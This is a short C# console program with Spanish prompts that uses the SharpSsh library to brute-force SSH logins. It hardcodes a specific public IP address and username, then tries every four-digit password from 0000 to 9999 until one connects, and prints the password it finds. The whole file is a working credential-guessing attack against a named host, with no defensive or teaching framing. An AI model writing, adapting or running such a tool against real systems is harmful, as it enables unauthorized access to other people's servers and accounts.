﻿using System;
using Tamir.SharpSsh;
using System.Threading;
using System.IO;

namespace sshfb
{
    /// <summary>
    /// Summary description for sharpSshTest.
    /// </summary>
    public class Program
    {
        static string host, user, pass;
        public static void Main()
        {
            PrintVersoin();
            Console.WriteLine();
            Console.WriteLine("1) Conectarse al servidor");
            Console.WriteLine();

        INPUT:
            int i = -1;
            Console.Write("Por favor introduce 1: ");
            try
            {
                i = int.Parse(Console.ReadLine());
                Console.WriteLine();
            }
            catch
            {
                i = -1;
            }

            switch (i)
            {
                case 1:
                    SshStream();
                    break;

                default:
                    Console.Write("Algo salio mal!!, ");
                    goto INPUT;
            }
        }

        /// <summary>
        /// Get input from the user
        /// </summary>
        public static void GetInput()
        {
            // Console.Write("Remote Host: ");
            host = "74.208.234.113";
            //Console.Write("User: ");
            user = "msicuprueba";
            //Console.Write("Password: ");
            pass = "0";
            //Console.WriteLine();
        }

        /// <summary>
        /// Demonstrates the SshStream class
        /// </summary>
        public static void SshStream()
        {
            GetInput();
            SshShell sshShell = new SshShell(host, user);
            for (int i = Convert.ToInt32(pass); i < 9999; i++)
            {
                
                try
            {

                    string pp = Convert.ToString(i);
                    int length = pp.Length;
                   
                    switch (length)
                    {
                        case 1:
                            pass = "000" + pp;
                          
                            break;
                        case 2:
                            pass = "00" + pp;
                           
                            break;
                        case 3:
                            pass = "0" + pp;
                            
                            break;
                        case 4:
                            pass = pp;
                           
                            break;
                        default:
                            Console.WriteLine("fuera de rango");
                                break;
                    }

                    
                    sshShell.Password = pass;
                    sshShell.RedirectToConsole();
                    Console.Write("Connecting...");

                    sshShell.Connect();
                    Console.WriteLine("Conectado con el pass: " + pass);
                    break;

                    /*
                    if (pass != null)
                        sshShell.Password = pass;

                    sshShell.RedirectToConsole();
                    Console.Write("Connecting...");

                    sshShell.Connect();
                    Console.WriteLine("OK");
                   
                    while (sshShell.ShellOpened)
                        Thread.Sleep(500);
                    Console.Write("Disconnecting...");
                    sshShell.Close();
                    Console.WriteLine("OK");
                    */

                }
                catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                    Console.WriteLine("No se pudo conectar con el password: " + pass);
                    //Console.ReadLine();
            }
        };

    }

    static void PrintVersoin()
        {
            try
            {
                System.Reflection.Assembly asm
                    = System.Reflection.Assembly.GetAssembly(typeof(Tamir.SharpSsh.SshStream));
                Console.WriteLine("sharpSsh v" + asm.GetName().Version);
            }
            catch
            {
                Console.WriteLine("sharpSsh v1.0");
                
            }
        }

        

    }
    
}